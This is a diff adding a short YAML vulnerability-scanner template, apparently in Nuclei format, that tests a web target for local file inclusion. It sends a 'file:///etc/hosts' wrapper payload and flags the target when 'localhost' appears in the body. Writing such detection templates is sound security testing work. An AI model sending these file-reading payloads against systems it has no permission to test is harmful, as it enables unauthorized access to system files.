@@ -1,0 +1,20 @@
+id: lfi5-072
+name: 'Wrapper file via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via file wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - 'file:///etc/hosts'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'localhost'
